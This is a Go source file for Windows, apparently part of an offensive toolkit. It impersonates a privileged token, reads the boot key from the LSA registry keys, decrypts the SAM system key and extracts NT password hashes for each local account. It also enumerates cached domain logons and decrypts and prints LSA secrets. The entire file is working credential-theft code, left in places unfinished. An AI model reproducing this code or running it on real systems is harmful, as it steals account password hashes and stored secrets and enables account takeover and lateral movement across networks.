package lib

import (
	"bytes"
	"fmt"

	"encoding/binary"
	"encoding/hex"

	"golang.org/x/sys/windows"

	"strings"
	// "log"
	"strconv"

	"golang.org/x/sys/windows/registry"
)


func TestRegAccess(token windows.Token) error {
	err := InjectToken(token)
	if err != nil {
		return err
	}
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion`, registry.READ)
	defer  key.Close()

	_, _, err = key.GetStringValue("ProgramFilesDir")
	if err != nil {
		return err
	}
	return nil
}

func DumpSAM(token windows.Token) ([]*sam_account, error) {
	var acc []*sam_account
	err := InjectToken(token)
	if err != nil {
		return acc, err
	}
	
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SAM\SAM\Domains\Account\Users`, registry.READ)
	if err != nil {
		return acc, fmt.Errorf("failed to open Users key: %w", err)
	}
	defer key.Close()

	subKeys, err := key.ReadSubKeyNames(-1)
	if err != nil {
		return acc, fmt.Errorf("failed to read subkeys: %w", err)
	}

	bootKey, err := GetBootKey(token)
	if err != nil {
		return acc, fmt.Errorf("failed to get boot key: %w", err)
	}

	systemKey, err := GetSysKey(token, bootKey)
	if err != nil {
		return acc, fmt.Errorf("failed to get system key: %w", err)
	}

	for _, k := range subKeys {
		// Skip non-RID keys (like "Names")
		if len(k) != 8 {
			continue
		}

		// Parse RID from the key name
		rid, err := parseRIDFromKey(k)
		if err != nil {
			continue // Skip invalid RIDs
		}

		subKeyPath := fmt.Sprintf(`SAM\SAM\Domains\Account\Users\%s`, k)
		subKey, err := registry.OpenKey(registry.LOCAL_MACHINE, subKeyPath, registry.READ)
		if err != nil {
			continue
		}
		defer subKey.Close()

		subKeyData, err := subKey.ReadValueNames(-1)
		if err != nil {
			continue
		}

		// Check if this is a valid user entry (should have "V" value)
		if len(subKeyData) > 1 {
			v, _, err := subKey.GetBinaryValue("V")
			if err != nil {
				continue
			}

			data := GetNT(v, rid, systemKey)
			acc = append(acc, &data)
		}
	}
	result, err := GetCachedHash(token, bootKey)
	fmt.Println(result)
	getServiceUser(token)

	return acc, nil
}

// parseRIDFromKey extracts the RID from a registry key name
func parseRIDFromKey(keyName string) (uint32, error) {
	// Registry key names for user accounts are stored as hex strings
	// Remove any leading/trailing whitespace
	keyName = strings.TrimSpace(keyName)
	
	// Validate key format
	if len(keyName) != 8 {
		return 0, fmt.Errorf("invalid key length: %s", keyName)
	}

	// Parse the hex string to uint32
	ridInt, err := strconv.ParseUint(keyName, 16, 32)
	if err != nil {
		return 0, fmt.Errorf("failed to parse RID from key %s: %w", keyName, err)
	}

	return uint32(ridInt), nil
}

func GetCachedHash(token windows.Token, bootkey []byte) (result []string, err error) {
    err = InjectToken(token) // inject token
    if err != nil {
        return nil, fmt.Errorf("failed to inject token: %w", err)
    }

    var names []string
    foundIterCount := false
    
    key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Security\Cache`, registry.READ)
    if err != nil {
        return nil, fmt.Errorf("failed to open Security\\Cache registry key: %w", err)
    }
    defer key.Close()

    valueNames, err := key.ReadValueNames(-1)
    if err != nil {
        return nil, fmt.Errorf("failed to read value names: %w", err)
    }

    for _, name := range valueNames {
        if name == "NL$Control" {
            continue
        }
        if name == "NL$IterationCount" {
            foundIterCount = true
            continue
        }
        names = append(names, name)
    }

    if foundIterCount {
        var tmpIterCount uint32
        // Fix: Use the correct path to open the key
        iterKey, err := registry.OpenKey(registry.LOCAL_MACHINE, `Security\Cache\NL$IterationCount`, registry.READ)
        if err != nil {
            return nil, fmt.Errorf("failed to open NL$IterationCount key: %w", err)
        }
        defer iterKey.Close()

        names, err := iterKey.ReadValueNames(-1)
        if err != nil {
            return nil, fmt.Errorf("failed to read iteration count value names: %w", err)
        }
        if len(names) == 0 {
            return nil, fmt.Errorf("no iteration count values found")
        }

        data, _, err := iterKey.GetBinaryValue(names[0])
        if err != nil {
            return nil, fmt.Errorf("failed to get binary value: %w", err)
        }
        if len(data) < 4 {
            return nil, fmt.Errorf("iteration count data too short")
        }

        tmpIterCount = binary.LittleEndian.Uint32(data)
        // Store iteration count in result properties if needed
        if tmpIterCount > 10240 {
            // iterationCount = int(tmpIterCount & 0xfffffc00)  // Commented out since it's unused
            fmt.Printf("Iteration count: %d\n", int(tmpIterCount & 0xfffffc00))
        } else {
            // iterationCount = int(tmpIterCount * 1024)  // Commented out since it's unused
            fmt.Printf("Iteration count: %d\n", int(tmpIterCount * 1024))
        }
    } else {
        fmt.Printf("Using default iteration count: %d\n", 10240)
    }

    secretKey, err := GetLSASecretkey(token, bootkey)
	fmt.Println(secretKey)
    if err != nil {
        return nil, fmt.Errorf("failed to get LSA secret key: %w", err)
    }

    return names, nil // Changed to return the collected names instead of empty result
}

func GetLSASecretkey(token windows.Token, bootkey []byte) (result []byte, err error) {
    err = InjectToken(token) // inject token
    if err != nil {
        return nil, fmt.Errorf("failed to inject token: %w", err)
    }

    key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Security\Policy\PolEKList`, registry.READ)
    if err != nil {
        return nil, fmt.Errorf("failed to open PolEKList registry key: %w", err)
    }
    defer key.Close()

    data, _, err := key.GetBinaryValue("")
    if err != nil {
        return nil, fmt.Errorf("failed to get binary value: %w", err)
    }

    result, err = DecryptLSAKey(bootkey, data)
    if err != nil {
        return nil, fmt.Errorf("failed to decrypt LSA key: %w", err)
    }

    return result, nil
}
func GetLSASecrets(token windows.Token, bootKey,lsaKey []byte) (secrets []string, err error) {
	err = InjectToken(token) // inject token
    if err != nil {
        return nil, fmt.Errorf("failed to inject token: %w", err)
    }
	secrets_path := `SECURITY\Policy\Secrets`
	reg_key, err := registry.OpenKey(registry.LOCAL_MACHINE, secrets_path, registry.READ)
    if err != nil {
        return nil, fmt.Errorf("failed to open PolEKList registry key: %w", err)
    }
	var keys []string
    defer reg_key.Close()
	fmt.Println(reg_key.ReadValueNames(-1))
	keys, _ = reg_key.ReadSubKeyNames(-1)
	for _, key := range keys {
		
		if key == "NL$Control" { // Skip
			continue
		}
		fmt.Printf("key: %s",key)
		valueTypeList := []string{"CurrVal"}
		// var secret []byte

		for _, valueType := range valueTypeList {
			// var subKey []byte
			p := fmt.Sprintf(`%s\%s\%s`, secrets_path, key, valueType)
			k, _ := registry.OpenKey(registry.LOCAL_MACHINE, p, registry.READ)
			value, _, _ := k.GetBinaryValue("")
			if (len(value) !=0) && (value[0] == 0x0) {
				record := &lsa_secret{}
				record.unmarshal(value)
				tmpKey := SHA256(lsaKey, record.EncryptedData[:32],0)
				plaintext, err := DecryptAES(tmpKey, record.EncryptedData[32:], nil)
				if err != nil {
					fmt.Println(err)
					continue
				}
				record2 := &lsa_secret_blob{}
				record2.unmarshal(plaintext)
				secret := record2.Secret
				fmt.Println(secret)
			}
			// ps, err := parseSecret()
			// secrets = append(secrets, *ps)

		}
	}
	return nil, nil
}



func GetBootKey(token windows.Token) (result []byte, err error) {
	err = InjectToken(token) // inject token
	if err != nil {
		return nil, err
	}

	// Initialize result and scrambled with proper size
	result = make([]byte, 16)
	scrambled := make([]byte, 0, 16)
	
	// Permutation array for unscrambling
	var p []byte = []byte{0x8, 0x5, 0x4, 
		0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7}

	// Open the LSA key
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, 
		`SYSTEM\CurrentControlSet\Control\Lsa`, registry.READ|registry.QUERY_VALUE)
	if err != nil {
		return nil, fmt.Errorf("error opening LSA key: %v", err)
	}
	defer key.Close()

	// Read the values from the registry
	names := []string{"JD", "Skew1", "GBG", "Data"}
	for _, name := range names {
		subKey, err := registry.OpenKey(key, name, registry.READ|registry.QUERY_VALUE)
		if err != nil {
			return nil, fmt.Errorf("error opening subkey %s: %v", name, err)
		}
		defer subKey.Close()

		// Pre-allocate a large enough buffer for the class
		const maxClassSize = 1024 // Larger buffer size
		classBytes := make([]uint16, maxClassSize)
		classLen := uint32(maxClassSize)
		
		// Get the class string with all other parameters
		var subKeyCount, maxSubKeyLen, maxClassLen uint32
		var valueCount, maxValueNameLen, maxValueLen uint32
		var secDescLen uint32
		var lastWriteTime windows.Filetime

		err = windows.RegQueryInfoKey(
			windows.Handle(subKey),
			&classBytes[0],
			&classLen,
			nil,
			&subKeyCount,
			&maxSubKeyLen,
			&maxClassLen,
			&valueCount,
			&maxValueNameLen,
			&maxValueLen,
			&secDescLen,
			&lastWriteTime,
		)
		if err != nil {
			return nil, fmt.Errorf("error getting class for %s: %v", name, err)
		}

		// Convert class to string and decode hex
		class := windows.UTF16ToString(classBytes[:classLen])
		// log.Printf("Raw class string for %s: %s", name, class) // Debug logging

		decoded, err := hex.DecodeString(class)
		if err != nil {
			return nil, fmt.Errorf("error decoding hex from subkey %s: %v", name, err)
		}

		// Debug logging
		// log.Printf("Key %s class decoded (%d bytes): %x", name, len(decoded), decoded)

		scrambled = append(scrambled, decoded...)
	}

	// Verify we have exactly 16 bytes
	if len(scrambled) != 16 {
		return nil, fmt.Errorf("invalid scrambled key length: got %d bytes, want 16", len(scrambled))
	}

	// log.Printf("Scrambled key (%d bytes): %x", len(scrambled), scrambled)

	// Unscramble using the permutation array
	for i := 0; i < 16; i++ {
		if int(p[i]) >= len(scrambled) {
			return nil, fmt.Errorf("permutation index out of range: %d >= %d", p[i], len(scrambled))
		}
		result[i] = scrambled[p[i]]
	}

	bootKey := make([]byte, 16)
	copy(bootKey, result)

	// log.Printf("Boot key: %x", bootKey)

	return bootKey, nil
}
func GetSysKey(token windows.Token, bootKey []byte) ([]byte, error){
	err := InjectToken(token) // inject token
	if err != nil {
		return nil,err
	}
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SAM\SAM\Domains\Account`, registry.READ)
	defer key.Close()
	Data, _,err := key.GetBinaryValue("F")
	// TODO: Add code to decrypt the system key
	var encSysKey []byte
	var sysKeyIV []byte
	var tmpSys []byte
	sysKey := make([]byte, 16)
	f := &domain_account_f{}
	err = f.unmarshal(Data)
	if f.Revision == 3 {
		// AES
		samAESData := sam_key_data_aes{}
		err = binary.Read(bytes.NewBuffer(f.Data), binary.LittleEndian, &samAESData)
		if err != nil {
			return nil, err
		}
		sysKeyIV = samAESData.Salt[:]
		encSysKey = samAESData.Data[:samAESData.DataLen]
		tmpSys, err  = DecryptAES(bootKey, encSysKey, sysKeyIV)
		copy(sysKey, tmpSys)

	}else{
		err = fmt.Errorf("Unsupported revision %s", f.Revision)
		return nil, err
	}


	return sysKey, err

}